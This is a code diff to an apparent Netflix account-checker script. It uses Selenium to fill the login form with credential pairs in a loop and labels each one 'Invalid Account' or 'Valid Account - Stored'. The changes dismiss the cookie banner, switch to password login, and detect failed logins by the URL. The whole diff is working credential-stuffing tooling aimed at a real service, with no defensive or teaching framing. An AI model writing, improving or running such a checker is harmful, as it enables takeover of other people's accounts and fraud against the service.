@@ -116,8 +116,19 @@ while True:
 					browser_options = Options()
 					browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
 					browser = webdriver.Chrome(options = browser_options)
-					browser.set_window_size(600,600)
+					browser.set_window_size(500,700)
 					browser.get(page)
+					time.sleep(0.7)
+					if browser.find_elements(By.XPATH, '//button[@id="onetrust-reject-all-handler"]'):
+						button = browser.find_element(By.XPATH, '//button[@id="onetrust-reject-all-handler"]')
+						button.click()
+						time.sleep(0.7)
+					if browser.find_elements(By.XPATH, '//button[@data-uia="login-toggle-button"]'):
+						if browser.find_element(By.XPATH,
+												'//button[@data-uia="login-toggle-button"]').text == "Use password":
+							button = browser.find_element(By.XPATH,
+														  '//*[@id="appMountPoint"]/div/div/div[2]/div/form/button[2]')
+							button.click()
 					time.sleep(0.7)
 					login = browser.find_element(By.XPATH, '//input[@type="email"]')
 					password = browser.find_element(By.XPATH, '//input[@type="password"]')
@@ -129,7 +140,7 @@ while True:
 					password.send_keys(Keys.TAB)
 					password.send_keys(Keys.ENTER)
 					time.sleep(3)
-					if browser.find_element(By.XPATH, '//div[@role="alert"]'):
+					if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH, '//div[@role="alert"]'):
 						print("\033[38;5;196m Invalid Account",end='')
 					if browser.find_element(By.XPATH, '//div[@class="profiles-gate-container"]'):
 						print("\033[38;5;46m Valid Account - Stored",end='')
